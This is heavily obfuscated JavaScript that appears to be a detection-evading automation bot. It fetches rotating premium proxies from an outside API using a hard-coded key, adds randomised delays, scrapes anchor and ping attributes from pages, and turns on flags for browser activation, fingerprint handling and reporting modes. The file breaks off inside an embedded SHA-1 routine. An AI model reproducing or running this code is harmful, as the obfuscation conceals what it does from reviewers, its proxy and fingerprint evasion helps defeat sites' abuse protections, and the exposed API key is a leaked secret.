function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2651 + 0xbb7 * -0x2 + -0xee3);
    let h = e[f];
    return h;
  }, d(b, c);
}
const P = d,
  O = b,
  N = c;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0x251 + 0x1f * -0x8f + 0xf01))) + h;
}
async function randomWait() {
  return await wait(-0x1152 + 0x1 * 0x166d + 0xe6d + (-0x1f * 0x5f + 0x4 * -0x4cd + 0x9 * 0x595) * random()), -0x3 * -0x905 + 0x121 * -0x11 + -0x3 * 0x29f;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      -0x1 * 0x1664 + 0x26c * 0x7 + -0xc7 * -0x7 === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(0x1014 + -0x7 * 0x21e + 0x6b * -0x3) === i)
      return null;
    const j = i + h['length'] + (0x1715 + -0x1337 * 0x1 + -0x1ee * 0x2),
      k = f['indexOf']('\x22', j);
    return -(-0x1a84 + 0x371 * -0x4 + 0x2849 * 0x1) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > 0xb * 0x32d + 0x670 + -0x14ae * 0x2 && f['includes'](':');
}
async function getRandomProxy() {
  let f;
  for (; !f;) {
    const g = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + 'yes&key=68' + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](h => h['text']());
    isValidProxy(g) && (f = g), log('Didn\x27t\x20wor' + 'k:\x20' + g), await wait(-0x1eb0 + 0x112 * -0xa + 0x2d4c);
  }
  return f;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  sha1 = ((() => {
    const M = c;
    var f, g, h, i, j, k, l, m, n = 'object' == typeof window ? window : {},
      o = !n['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    o && (n = global), f = ('0123456789' + 'abcdef')['split'](''), g = [-(0x21140a02 + -0x428dc * 0xe86 + 0x9b556126), -0x111760 + -0xb3af05 + 0x1 * 0x144c665,
      0xb2 * -0x32 + 0x1820 + 0x13 * 0x74c, -0xb65 * -0x3 + -0x1 * 0x6d1 + -0x2 * 0xd6f
    ], h = [-0x54 * -0x65 + 0x2 * 0x3d3 + -0x1459 * 0x2, -0x3e5 * -0x4 + -0x1 * -0x222b + -0x31af * 0x1,
      0x1cea * -0x1 + -0x130f + -0x3001 * -0x1,
      0x1 * 0x185 + -0x1308 + 0x1183
    ], i = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], j = [], k = function(r) {
      return function(s) {
        return new p(0x2 * -0xf7b + -0x1695 + 0x2e * 0x12a)['update'](s)[r]();
      };
    }, l = function() {
      var r, s, u = k('hex');
      for (o && (u = m(u)), u['create'] = function() {
          return new p();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, r = 0x1e72 + -0x1026 * -0x1 + -0xd5 * 0x38; r < i['length']; ++r)
        s = i[r], u[s] = k(s);
      return u;
    }, m = function(r) {
      var s = eval('require(\'crypto\');'),
        t = eval('require(\'buffer\')[\'Buffer\'];'),
        u = function(v) {
          if ('string' == typeof v)
            return s['createHash']('sha1')['update'](v, 'utf8')['digest']('hex');
          if (v['constructo' + 'r'] === ArrayBuffer)
            v = new Uint8Array(v);
          else {
            if (void(-0x215f * -0x1 + -0x1626 + 0x1 * -0xb39) === v['length'])
              return r(v);
          }
          return s['createHash']('sha1')['update'](new t(v))['digest']('hex');
        };
      return u;
    };
    class p {
      constructor(r) {
          const L = b;
          r ? (j[-0x612 + 0x641 * -0x1 + 0xc53 * 0x1] = j[-0x9 * -0x77 + -0xe * -0x24f + -0x2471 * 0x1] = j[-0x1 * -0xd3 + -0x2 * 0x21b + 0x3e * 0xe] = j[-0xbc9 * -0x3 + 0x166 * -0x3 + -0x37 * 0x91] = j[0x160b + 0xad8 + -0x20e0] = j[-0x1 * -0xce + 0x675 * -0x5 + 0x1f7f] = j[-0x2a5 * -0xb + -0x8a6 + 0x4 * -0x51b] = j[-0x13f7 + -0x1 * -0x260d + -0x10 * 0x121] = j[-0x19 * -0x119 + 0x168d * 0x1 + -0x31f7] = j[-0xea * -0x1 + 0x1533 + -0x1615] = j[0x1b3 + -0x8e4 + 0x73a] = j[-0x1 * 0x1f99 + -0x1913 + 0x38b6] = j[-0x228e + -0x397 * -0x8 + 0x5e1] = j[-0x6 * -0x3b3 + 0x1e3f + 0x33 * -0x107] = j[0x1645 + -0xc1f + 0x37 * -0x2f] = j[0x33d * 0xb + 0x10e9 + -0x347a] = j[-0x1d82 + 0xb9b + -0xf2 * -0x13] = 0x2005 * 0x1 + -0x1c10 + -0x3f5, this['blocks'] = j) : this['blocks'] = [-0x2 * -0xdd5 + -0x49 * 0x29 + 0x2f * -0x57,
            0x29 * 0x56 + 0x1 * -0x170 + -0xc56,
            0x11a5 * 0x1 + 0xe16 + -0x1 * 0x1fbb,
            0xa61 + -0x1eb + -0x876,
            0x2013 + 0x269c + -0x46af, -0x14db * -0x1 + -0x236a + -0x1 * -0xe8f,
            0x8ec + 0x3 * -0x100 + -0x5ec * 0x1, -0x342 + -0x34c * -0x7 + -0x3b * 0x56, -0x472 * -0x7 + 0x1 * 0x1598 + -0x3 * 0x1192,
            0x3ee + 0x4d5 * 0x4 + -0x1742,
            0x1a3a + 0x110 * 0x9 + -0x23ca, -0x1ced + 0x382 * -0x2 + -0x3 * -0xbfb, -0x1e9c + 0x5f6 + 0x4ee * 0x5, -0xfd * -0x1 + -0x1943 * 0x1 + 0x1a * 0xef, -0x23c9 + 0x1dd0 + -0xb * -0x8b,
            0x2 * 0xb87 + -0x50f + -0x11 * 0x10f,
            0x195e + -0x2174 + -0xf * -0x8a
          ], this['h0'] = -0x5b3f360d + 0x2 * -0xad6556c + 0xd83103e6, this['h1'] = -0x15dafd9cb + -0xfc2ab70c + 0x349a83c60, this['h2'] = 0x6b * -0xe50b59 + -0x91 * 0x798bdf + 0x13d4ed480, this['h3'] = 0x4289d * 0x5ff + 0x4c0b83 * -0x12 + -0x36461b7, this['h4'] = -0x278 * -0x3348bf + -0xa * -0x20b97d17 + -0x10207987e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * 0xfb3 + -0x101 * -0x26 + 0xf * -0x397, this['finalized'] = this[L(0x9, 'FfXh')] = -0x31e + -0xb5 * -0x4 + 0x4a, this['first'] = -0x2690 + -0x13 * 0xcb + 0x35a2;
        }
        ['update'](u) {
          var v, w, x, y, z, A;
          if (!this['finalized']) {
            for ((v = 'string' != typeof u) && u['constructo' + 'r'] === n['ArrayBuffe' + 'r'] && (u = new Uint8Array(u)), x = -0x2 * -0x656 + 0x3a * -0x4f + 0x53a, z = u['length'] || 0xba * -0x28 + -0x1b5b * -0x1 + 0x17 * 0x13, A = this['blocks']; x < z;) {
              if (this['hashed'] && (this['hashed'] = 0x5 * 0x569 + 0x240c + -0x3f19, A[0xe5 * -0x14 + 0x7 * -0x3d + 0x138f] = this['block'], A[0x1df5 * 0x1 + -0x4c7 + -0x191e] = A[0x9eb * 0x3 + 0x4 * 0x69a + -0x3828] = A[0x23c3 + -0x35 * -0x52 + -0x34bb * 0x1] = A[-0x5 * 0x6be + 0x95 * 0x3c + -0x133] = A[0x1856 + -0x107a + 0x2 * -0x3ec] = A[0x1 * -0x11d1 + -0x8a5 * -0x1 + 0x931] = A[0x84f + -0x1 * 0x1af2 + -0x12a9 * -0x1] = A[0x2c * 0x9f + 0x138b + -0x2ed8] = A[-0x1b76 + -0x1 * 0x63d + -0x21bb * -0x1] = A[0x1 * 0x18bf + 0x5a3 * -0x3 + -0x1 * 0x7cd] = A[-0x32b * 0x4 + 0x60b * 0x5 + -0x1181] = A[0x2c3 * 0xd + 0x1 * -0x2023 + -0x3b9] = A[-0xc90 + 0x1446 + -0x7aa] = A[-0x772 + 0x1c8 + 0x5b7] = A[0xf6b + -0x123 * 0x19 + 0xd0e * 0x1] = A[-0xd * -0x23f + 0x233 + -0x47 * 0x71] = -0x32 * 0x8 + -0xc87 * 0x3 + 0x38f * 0xb), v) {
                for (y = this['start']; x < z && y < 0x391 + 0xaa7 + -0xdf8; ++x)
                  A[y >> -0x182f + -0xe46 * -0x2 + 0x5 * -0xdf] |= u[x] << h[-0x3b7 + 0x7bb + -0x401 & y++];
              } else {
                for (y = this['start']; x < z && y < -0x22e3 + 0x1e44 + 0x4df; ++x)
                  (w = u['charCodeAt'](x)) < -0x1c5 * -0x14 + -0xe9b + 0x241 * -0x9 ? A[y >> 0x1d9 + 0x53 * -0x6b + -0xa * -0x349] |= w << h[0x18e1 + 0xa56 * -0x3 + -0x312 * -0x2 & y++] : w < 0x733 + -0x1d71 * -0x1 + -0x1ca4 ? (A[y >> -0x25d3 + -0x1784 + 0x3d59] |= (-0x10 * -0x1df + 0x72f * -0x2 + -0xed2 | w >> 0x194a + -0xa * 0x27c + -0xc * 0x9) << h[-0x215e + 0x21bc + -0x5b & y++], A[y >> 0x127 * -0x1 + -0x1083 + 0x27 * 0x74] |= (-0x3 * 0x8b4 + 0x204c + 0x68 * -0xe | 0x1 * 0x22cf + -0x66c * 0x5 + -0x274 & w) << h[-0x1ed5 + -0x4 * 0xe0 + -0x38 * -0x9d & y++]) : w < 0x2 * 0x5bda + -0x1 * -0x15da3 + -0x13d57 * 0x1 || w >= -0x26b8 + -0x966d + -0x3 * -0x89b7 ? (A[y >> 0x77 * -0x47 + -0x1 * -0x15f3 + -0x30 * -0x3b] |= (-0x3 * 0x12b + -0x1d * 0x77 + 0x11dc * 0x1 | w >> -0x21e3 + 0xcd4 + 0x151b) << h[-0x1c50 + -0x19f3 * -0x1 + -0x13 * -0x20 & y++], A[y >> 0xb * 0x2f1 + 0x2131 + -0x20c5 * 0x2] |= (0x11 * 0x15d + -0x88b + -0xe22 | w >> 0x1 * -0x9a3 + 0x1 * -0xaed + 0x41e * 0x5 & 0x7f7 + -0x4e1 * -0x1 + -0xc99) << h[0x3a5 * 0x7 + 0x4 * -0xa4 + 0x2 * -0xb78 & y++], A[y >> -0x9be * 0x1 + 0x1 * -0x2d9 + 0xc99] |= (0x355 * -0x4 + 0x1 * 0x152f + -0x75b * 0x1 | -0x20eb + -0x23e7 + 0x4511 & w) << h[-0x1 * 0x815 + 0x5 * 0x43f + 0x3b * -0x39 & y++]) : (w = 0x16 * 0x95f + 0x4030 * 0x5 + -0x10f1a + ((0xf4c + -0xb * 0x2c9 + 0xa5 * 0x1e & w) << 0x2 * 0x736 + -0x1bf8 + -0x1 * -0xd96 | 0x26ea + -0xb21 + 0x2a * -0x91 & u['charCodeAt'](++x)), A[y >> 0x179f + -0x1 * 0x71b + -0x841 * 0x2] |= (0xb42 + -0xaca + 0x78 | w >> 0x18da + 0x1fa8 + -0x3870) << h[0x1 * -0x20d3 + 0x4da + 0x1bfc & y++], A[y >> 0x471 + 0x3 * 0x207 + -0xa84 * 0x1] |= (0x74 * 0x26 + 0x20e3 + -0xf9 * 0x33 | w >> 0x2110 + 0x1ce5 + -0x6e1 * 0x9 & -0x5 * 0x455 + -0x19bf + 0x2fa7 * 0x1) << h[0x13ec + -0x10 * -0x10d + -0x24b9 & y++], A[y >> -0x8b3 + 0x2055 + -0x17a0] |= (-0x4d5 * -0x2 + 0xe * -0xd6 + 0xd * 0x32 | w >> 0xcd4 + -0x27f * 0x7 + 0x4ab & -0x2a8 + -0x15ed + 0x18d4) << h[-0x881 + 0x2b * -0x95 + 0x218b & y++], A[y >> 0x1a07 + 0x5ab + -0x1fb0] |= (-0x3 * -0x8f + 0x1da9 + -0x2 * 0xf6b | -0x3f3 + -0x3 * 0x481 + 0x11b5 & w) << h[-0xf89 + -0x1fbd + 0x2f49 & y++]);
              }
              this['lastByteIn' + 'dex'] = y, this['bytes'] += y - this['start'], y >= -0x1228 + 0x25ea + 0x2 * -0x9c1 ? (this['block'] = A[-0x1 * 0x218d + -0xf36 + 0x30d3], this['start'] = y - (0x14 * -0x1c0 + 0x1f87 + 0x3b9 * 0x1), this['hash'](), this['hashed'] = 0xa * 0x345 + -0x73 * -0x55 + -0x46e0) : this['start'] = y;
            }
            return this['bytes'] > 0x1bf599cef + -0xfc * -0x27bf0f + -0xe679afb4 && (this['hBytes'] += this['bytes'] / (0x2ab * -0x9cfc94 + 0x1a7c4044 + 0x288599e98) << -0x368 + -0x27 * 0x9 + 0x4c7, this['bytes'] = this['bytes'] % (0x115c41860 + -0x90b91e * -0x170 + -0xe5ce3380)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = 0x1 * -0x9b7 + 0x1 * -0x2483 + 0x2e3b;
            var r = this['blocks'],
              s = this['lastByteIn' + 'dex'];
            r[0x2ee + -0x8e2 + -0x14 * -0x4d] = this['block'], r[s >> 0xb62 + 0xf3 * 0x9 + 0x13eb * -0x1] |= g[-0x3fd * -0x1 + -0x1 * -0xfa6 + -0x13a0 & s], this['block'] = r[-0x6 * -0x37d + 0xdb8 * 0x2 + -0x304e], s >= -0x1c * -0xf5 + -0x70 * -0x49 + -0x3a84 && (this['hashed'] || this['hash'](), r[0x3c1 + 0xb4b * -0x1 + -0x2 * -0x3c5] = this['block'], r[0x6c * -0x7 + -0x19d9 + -0x3 * -0x99f] = r[0x23b * 0x2 + 0x1e7 * -0x1 + -0x28e] = r[-0x2557 + -0x1822 + 0x3d7b] = r[0x1e5 + -0xa09 + -0x1 * -0x827] = r[-0x387 + -0x19 * -0x100 + -0x1575] = r[0x20d8 + 0xe36 + -0x2f09] = r[-0x1ab * -0x4 + 0x1b78 + 0x110f * -0x2] = r[-0x7ec + -0x1 * 0x3f2 + 0x23 * 0x57] = r[0xf53 * 0x2 + -0x4 * 0x4d6 + 0xb46 * -0x1] = r[-0xc66 * 0x2 + 0x5fb + 0x12da] = r[-0xb81 + -0x5bc + 0x1 * 0x1147] = r[0x2 * -0x430 + 0x1a68 + -0x11fd] = r[0x619 * -0x5 + -0x26a4 * 0x1 + -0x452d * -0x1] = r[-0x1935 * -0x1 + 0x10ad + 0x29d5 * -0x1] = r[0xb56 + -0xb86 + 0x3e] = r[-0xe61 + -0x4 * -0x8ed + -0x1544] = 0x7 * 0x527 + 0x1b22 + -0x3f33), r[-0x202f + -0x1764 + 0x12f * 0x2f] = this['hBytes'] << -0x13a0 + 0x2338 + -0xf95 | this['bytes'] >>> 0x2273 + -0x24c9 + 0x13 * 0x21, r[0x80d + 0x305 + -0xb03] = this['bytes'] << 0x9 * -0x2c2 + -0x1cee + 0x35c3 * 0x1, this['hash']();
          }
        }
        ['hash']() {
          var u, v, w = this['h0'],
            x = this['h1'],
            y = this['h2'],
            z = this['h3'],
            A = this['h4'],
            B = this['blocks'];
          for (u = -0x2f * 0x37 + -0x1fda + -0x4ab * -0x9; u < 0x1 * 0x83d + -0xeb6 + 0x6c9; ++u)
            v = B[u - (0x42f + 0xd * 0x156 + 0x158a * -0x1)] ^ B[u - (0x5d * 0x43 + -0x16ef + -0x160 * 0x1)] ^ B[u - (0xa3 + -0x22 * -0x1f + -0x4b3)] ^ B[u - (0x2 * -0xb0c + -0x1690 + -0x2cb8 * -0x1)], B[u] = v << 0x159 + 0x1659 + -0x17b1 | v >>> -0x1b18 + 0x1cb8 + 0x5 * -0x4d;
          for (u = 0x2123 + 0x15e + -0x2281; u < -0x2 * 0x5d3 + -0x18b9 + 0x2473; u += 0x26d8 + 0x1 * 0x1de + -0x28b1)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x1945 + 0x9ed + -0x232d | w >>> 0x102a + -0x467 * 0x1 + -0x1 * 0xba8) + (x & y | ~x & z) + A + (-0x3 * -0x304ab163 + -0x5f808478 + 0x149174f4 * 0x2) + B[u] << 0x54f + 0x174b + -0x1c9a) << 0x26 * 0xd3 + 0xcf5 + -0x2c42 | A >>> -0xd03 + -0x1 * 0x951 + 0x166f) + (w & (x = x << -0x3 * -0x1cd + -0xb * 0x81 + -0x1 * -0x42 | x >>> -0x24f4 + -0xea7 + 0x339d) | ~w & y) + z + (-0x6aeaf641 + 0xa3f3f8a * -0xc + 0x1 * 0x140646a52) + B[u + (0x55 * -0x55 + 0x23 * 0x8a + 0x95c)] << -0x187b + 0x201d + 0x7a2 * -0x1) << -0x185 * -0xe + 0x19d * -0x7 + -0x1 * 0x9f6 | z >>> 0x1578 + 0xada + -0x2037 * 0x1) + (A & (w = w << -0xa2 * -0x1d + -0x1 * 0x113d + -0xff | w >>> 0x90b + 0x5b6 + 0x2f3 * -0x5) | ~A & x) + y + (0x133 * 0x2e0d5d + 0xb26a72df + 0x8f21ffcd * -0x1) + B[u + (0x164 + -0x491 + 0x32f * 0x1)] << 0xc73 * 0x3 + 0xca0 + -0x1 * 0x31f9) << 0x7b7 * 0x4 + -0x1999 + -0x53e | y >>> 0x2 * -0x9cb + -0x1333 * 0x1 + -0x20c * -0x13) + (z & (A = A << 0x2d7 * -0x7 + 0x1c23 + 0x824 * -0x1 | A >>> 0xff8 + -0x11b8 + 0xe1 * 0x2) | ~z & w) + x + (-0x2 * -0x251bd88b + 0xa495b37d + -0x944aeafa) + B[u + (-0x1 * 0x80f + -0x1 * -0x147 + 0x6cb)] << -0x916 * -0x3 + -0x1 * 0x1639 + -0x509) << -0x21d9 + -0x6b9 * -0x2 + 0x1 * 0x146c | x >>> -0xd0a * -0x1 + -0x18a2 + -0x257 * -0x5) + (y & (z = z << 0x15fb + 0x5 * -0x2d + 0x4f * -0x44 | z >>> 0xfe3 + 0x2568 + -0x3549 * 0x1) | ~y & A) + w + (-0x9e0cef6d * 0x1 + 0x2 * -0x1d684cb1 + 0x2 * 0x99b00134) + B[u + (-0x8c + 0x19 * 0x67 + -0x97f)] << 0x2f * 0xb + 0xecf + -0x10d4, y = y << -0x365 * 0x7 + -0xae * -0x9 + 0x11c3 | y >>> 0xec4 + -0x61f * 0x5 + -0x1 * -0xfd9;
          for (; u < 0x1 * 0x20ed + -0x1 * -0x269 + -0x13 * 0x1da; u += 0x1a5 * 0xe + -0x1 * 0x1f0a + 0xb * 0xbb)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x1 * 0x2643 + -0xfa1 + -0x169d | w >>> -0x1e + -0x1 * 0x19cb + 0x1a04) + (x ^ y ^ z) + A + (0x1f70ae * -0x69d + 0x5 * -0x46b64f + 0x14027a9e2) + B[u] << -0x1 * 0x1e05 + 0x9ed + 0xa0c * 0x2) << -0x6 * 0x5b9 + 0x20c8 + 0x1f * 0xd | A >>> 0xf8 * 0xd + 0x239 * 0x4 + -0x1 * 0x1561) + (w ^ (x = x << -0x2160 + 0xdaf * 0x1 + -0xb * -0x1cd | x >>> 0x2489 + 0x1 * -0x1c73 + -0x814) ^ y) + z + (0xc95dd7 * -0xc7 + 0xd54641e4 + 0x361b9bde) + B[u + (0x200f * -0x1 + -0x23c1 + 0x43d1)] << -0x528 + 0x1469 + -0xf41) << 0x1fc5 + 0x259f + 0x2b * -0x19d | z >>> 0x2 * -0x9aa + 0x4d9 + 0xe96) + (A ^ (w = w << 0x9c * -0xa + -0xfa8 + 0x15de | w >>> -0xf45 + 0x3 * 0x935 + -0xc58) ^ x) + y + (0x77c2c507 + -0xb5be9a7e + 0x566ae08c * 0x2) + B[u + (-0xe * -0xf6 + -0x24a2 + 0x1730)] << -0x1664 + 0x1bdd + -0x1d3 * 0x3) << 0x26f7 + -0x1 * 0x183a + -0xeb8 | y >>> -0x1d * -0x11 + -0x162 * -0x3 + 0x2 * -0x2fc) + (z ^ (A = A << 0x1 * 0xd33 + -0x9d * -0x8 + -0x11fd * 0x1 | A >>> 0x269c + 0xb25 * -0x1 + 0x1b75 * -0x1) ^ w) + x + (-0x1f563cb3 * -0x7 + -0x16bd * -0x548c5 + -0xe4a964b5) + B[u + (0xe72 + 0x1 * -0xb5c + -0x313 * 0x1)] << -0x2d0 + -0x1 * 0xf67 + 0x1 * 0x1237) << -0x1419 + 0x76 * -0x2f + 0x29c8 | x >>> -0x2 * 0x4ff + -0x61 * 0xd + 0x783 * 0x2) + (y ^ (z = z << 0x150b * -0x1 + 0x1 * -0x26fb + 0x3c24 | z >>> 0xf * 0x133 + -0xb7e + -0x67d) ^ A) + w + (0x26dc5220 + -0x5cca4d82 + 0xa4c7e703) + B[u + (-0x143b * 0x1 + 0x1bd7 * 0x1 + -0x6c * 0x12)] << -0x40 * -0x4c + 0xc48 + 0x7 * -0x478, y = y << 0x47 * 0x81 + -0x1858 + -0xb51 | y >>> -0x7 * -0xc7 + 0x305 * -0xa + 0x18c3;
          for (; u < 0x9a0 + 0xc90 + -0x15f4; u += -0x1f83 + 0x10de + -0x755 * -0x2)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x49d + -0xfa5 + 0x7b * 0x17 | w >>> -0x63 * -0x45 + 0x251f + -0x3fb3) + (x & y | x & z | y & z) + A - (0x56eb * -0x2553b + -0x6d4b7b * -0xd4 + -0x3 * -0x4b0d457b) + B[u] << -0x1f31 * -0x1 + 0x1 * 0x1606 + -0xef * 0x39) << 0xc5 * 0xc + 0x46 * 0x61 + -0x23bd * 0x1 | A >>> 0x12d4 + -0x1f7 * 0xb + 0x2e4) + (w & (x = x << -0x653 + -0x2173 * -0x1 + 0x1b02 * -0x1 | x >>> 0x337 * 0x5 + 0x1 * -0x1b8d + 0xb7c) | w & y | x & y) + z - (-0x130b3364 * -0x8 + 0x1753616f + -0x4d * 0xd0bc97) + B[u + (-0x5 * -0x399 + -0x7 * -0x19f + 0x9c7 * -0x3)] << 0x1 * 0x869 + -0x1 * 0x70d + -0x6 * 0x3a) << -0x1153 + -0x98d + -0x11 * -0x195 | z >>> -0xd6 * -0x27 + 0x1 * 0x6bc + -0x273b) + (A & (w = w << -0x193e + 0x1d79 + -0x3 * 0x15f | w >>> -0x4b6 + 0x2b * -0x6d + 0x1 * 0x1707) | A & x | w & x) + y - (-0x60f01c6c + 0xdb83d63c + -0xa683 * 0xee4) + B[u + (0x22d0 + 0x72f + -0x29fd)] << -0x779 + -0x71f * 0x5 + 0x2b14) << 0xb11 + 0x3 * 0xc0b + -0x2f2d | y >>> 0x15ca + -0x9fa + -0xbb5) + (z & (A = A << -0x1cdf + 0x2433 + -0x736 | A >>> -0x3b * -0x3e + 0x3 * -0xb3c + 0x136c) | z & w | A & w) + x - (0xd283782f + 0x5 * 0x9d06b3b + -0x92b14d32) + B[u + (-0x14d1 * -0x1 + -0x5f7 * 0x2 + 0x238 * -0x4)] << -0xb29 * -0x1 + 0x1a4f + 0x2 * -0x12bc) << -0x18c1 + 0x1d00 + -0x43a | x >>> -0x1c65 * 0x1 + 0x16 * -0x148 + 0xe2c * 0x4) + (y & (z = z << -0x1e98 + 0x455 + -0x3 * -0x8cb | z >>> 0x25b3 + -0x3 * 0xace + -0x547) | y & A | z & A) + w - (-0x734b * -0x1a12c + 0xd1e9f6f3 + -0x11ce6afb3) + B[u + (-0x17f * 0x2 + -0x1a45 + 0x1d47)] << -0x1d52 + 0x34 * 0x1d + 0x176e, y = y << 0x3ed * -0x6 + 0x1a87 * -0x1 + -0xb5 * -0x47 | y >>> -0xb6 * -0x32 + 0x1a04 + -0x3d8e;
          for (; u < -0x13a2 + -0x5 * 0x695 + 0x78d * 0x7; u += 0x24fb + 0x5de + -0x2ad4)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x2 * -0x4b7 + -0x261b + 0x2f8e | w >>> -0xa86 + 0x1 * -0x943 + 0x4c * 0x43) + (x ^ y ^ z) + A - (0x21b01c39 + 0x1ebd51c1 + -0xad02fd0) + B[u] << 0x6 * -0x24d + 0x382 + -0xa4c * -0x1) << -0x5 * -0x119 + 0x12a1 + 0x1819 * -0x1 | A >>> 0xc7 * -0x2e + 0x109c + 0x5d * 0x35) + (w ^ (x = x << 0x228e + 0x1bae + -0x3e1e | x >>> -0xdeb + -0x6 * -0x292 + 0x17f * -0x1) ^ y) + z - (0x1511bd6b * 0x1 + 0x3 * -0xfe9ff11 + 0x50497df2) + B[u + (-0xf82 * 0x1 + 0x13 * 0xe3 + -0x156)] << 0x1291 + 0x6 * -0x49 + 0x1 * -0x10db) << 0x1eef + 0x1796 + -0x1b40 * 0x2 | z >>> -0x35 * 0xad + -0x2383 * 0x1 + 0x1 * 0x476f) + (A ^ (w = w << 0xeee + 0x177c + -0x264c * 0x1 | w >>> -0x1 * -0x1e89 + -0x29 * 0x1 + -0x256 * 0xd) ^ x) + y - (-0x1c81 * -0x1bcd9 + -0x4287c223 + -0x47 * -0xfe9b6c) + B[u + (-0xc0c + -0x252c + 0x313a)] << -0x1 * 0x74a + 0x688 + -0xc2 * -0x1) << 0x1d5b + -0x1ae0 + -0x276 | y >>> -0x1 * -0xf4d + 0x1a6b + -0x3 * 0xddf) + (z ^ (A = A << 0x359 + -0x11b1 * 0x1 + 0xe76 | A >>> -0x50b * 0x5 + 0x154f + 0x3 * 0x14e) ^ w) + x - (0x9a1b26f + -0x20 * -0x145d996 + 0x1 * 0x34058fb) + B[u + (0x24d3 + -0x85d * 0x2 + 0x1 * -0x1416)] << 0x1085 + 0x26df + -0x3764) << 0x2467 + -0x1aff * 0x1 + -0x963 | x >>> -0xc2 + -0x6 * -0x1be + -0x1eb * 0x5) + (y ^ (z = z << -0x2 * 0x111e + -0x1 * -0x14d1 + -0x1 * -0xd89 | z >>> 0x38 * 0xa9 + 0x586 + -0x4 * 0xa9f) ^ A) + w - (-0x5 * 0x99e96b3 + 0x1 * 0xdd3d884 + 0x13e1 * 0x46bc5) + B[u + (0x1 * -0x53a + 0x7dc + -0x29e)] << 0x25f + -0x1d3a + 0x5 * 0x55f, y = y << -0xb80 * -0x2 + -0x30 * -0x89 + 0x2 * -0x1849 | y >>> -0x1264 + 0x1be2 + -0x97c * 0x1;
          this['h0'] = this['h0'] + w << 0x3c8 * -0x7 + -0x1b29 * -0x1 + -0xb1, this['h1'] = this['h1'] + x << -0x1 * -0x1d2d + 0x124e + -0x2f7b, this['h2'] = this['h2'] + y << 0x4ed + -0x18be + -0x59 * -0x39, this['h3'] = this['h3'] + z << -0x1da5 * 0x1 + -0xfa * 0x5 + 0x1 * 0x2287, this['h4'] = this['h4'] + A << -0x709 * -0x3 + -0x11f6 + -0x325;
        }
        ['hex']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return f[u >> -0xd43 + -0x6 * 0x585 + 0x2e7d & -0x3a9 + 0x26ef * 0x1 + -0x5 * 0x70b] + f[u >> -0x1532 + -0x1b1f * 0x1 + 0x3069 & -0x1 * -0x1ec9 + -0x1267 + -0xc53] + f[u >> -0x1381 + -0xf18 + 0x22ad & 0x3 * -0xb57 + 0xbf * -0x7 + 0x274d] + f[u >> 0x4e4 + 0x199e + 0x1b1 * -0x12 & 0x72e + 0x1fe8 + -0x1 * 0x2707] + f[u >> -0x9 * -0x223 + 0x3 * -0x321 + 0x9cc * -0x1 & 0x55 * 0x49 + -0x133a * -0x2 + 0x1 * -0x3ea2] + f[u >> -0x20f6 + 0x1105 + 0x1 * 0xff9 & -0x193 + 0x1d71 * 0x1 + -0x71 * 0x3f] + f[u >> 0x1a17 + 0x1a7e + -0x3491 * 0x1 & -0x1c0 * -0xf + -0xb * -0x343 + -0x3e12] + f[0x24c6 + -0xc5 * -0x1 + -0x257c & u] + f[v >> -0xb76 + -0x210d + 0x2c9f & 0x2 * 0xe53 + 0x1d6d + -0x3a04] + f[v >> 0x216 * 0x2 + 0x210c + -0x2520 & -0x4d * -0x5c + -0x104d + -0xb50] + f[v >> 0x85f + 0x1591 + -0x1ddc & 0xb * 0x109 + -0x83 * -0x3b + -0x2985] + f[v >> 0x1f * 0xc7 + 0x13 * -0x125 + -0x2 * 0x125 & -0x1 * 0x29 + 0xea2 + -0xe6a] + f[v >> 0x1b9 * 0x6 + 0x1353 + -0x1d9d & -0x264e + 0x2 * -0xa9a + 0x3b91] + f[v >> -0x319 * -0xc + 0xa09 + -0x2f2d * 0x1 & 0x1e81 + -0x2a * -0xca + 0x3f96 * -0x1] + f[v >> 0x7 * 0xb7 + -0x20a * -0xc + -0x1d75 & 0x719 * 0x1 + 0x254f + -0x1 * 0x2c59] + f[0x2672 + -0x122 * -0x18 + 0x4193 * -0x1 & v] + f[w >> -0x2290 + -0x88e + 0x2b3a & -0x2482 * -0x1 + -0x1846 + 0x40f * -0x3] + f[w >> 0x2680 + 0xc4d + -0x32b5 & 0xa94 + -0x26ee + 0x1c69] + f[w >> 0x35 * 0x2 + -0x1 * -0x9cf + -0x1 * 0xa25 & 